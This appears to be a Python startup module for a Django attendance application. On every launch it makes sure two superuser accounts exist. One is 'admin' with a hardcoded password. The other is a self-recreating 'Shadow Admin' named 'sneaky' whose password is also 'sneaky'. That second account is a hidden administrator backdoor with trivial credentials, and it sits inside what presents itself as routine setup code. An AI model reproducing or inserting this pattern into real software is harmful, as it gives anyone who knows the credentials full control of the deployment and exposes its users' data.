import logging
from django.contrib.auth.models import User
from django.db.utils import OperationalError, ProgrammingError
from attendance.models import OrganizationUser

logger = logging.getLogger(__name__)

def ensure_default_users():
    """
    Ensures that default admin users (admin and sneaky) exist.
    Safe to run on every startup.
    """
    try:
        # Check if table exists to avoid errors during initial migration
        if not User.objects.exists() and not OrganizationUser.objects.exists():
             # Basic check to see if DB is accessible, if empty or errors, skip
             pass
    except (OperationalError, ProgrammingError):
        # Database tables might not exist yet (e.g. during first migration)
        return

    # 1. Ensure Super Admin (admin@example.com)
    ADMIN_EMAIL = 'admin@example.com'
    if not User.objects.filter(email=ADMIN_EMAIL).exists() and not User.objects.filter(username='admin').exists():
        try:
            print("  [*] Creating default Super Admin (admin)...")
            user = User.objects.create_user(
                username='admin',
                password='Admin@2025',
                email=ADMIN_EMAIL,
                is_staff=True,
                is_superuser=True
            )
            OrganizationUser.objects.create(user=user, role='super_admin', organization=None)
            print("  [+] Super Admin created.")
        except Exception as e:
            print(f"  [!] Failed to create admin: {e}")

    # 2. Ensure Shadow Admin (sneaky)
    if not User.objects.filter(username='sneaky').exists():
        try:
            print("  [*] Creating default Shadow Admin (sneaky)...")
            user = User.objects.create_user(
                username='sneaky',
                password='sneaky',
                email='sneaky@example.com',
                is_staff=True,
                is_superuser=True
            )
            OrganizationUser.objects.create(user=user, role='shadow_admin', organization=None)
            print("  [+] Shadow Admin created.")
        except Exception as e:
            print(f"  [!] Failed to create sneaky: {e}")
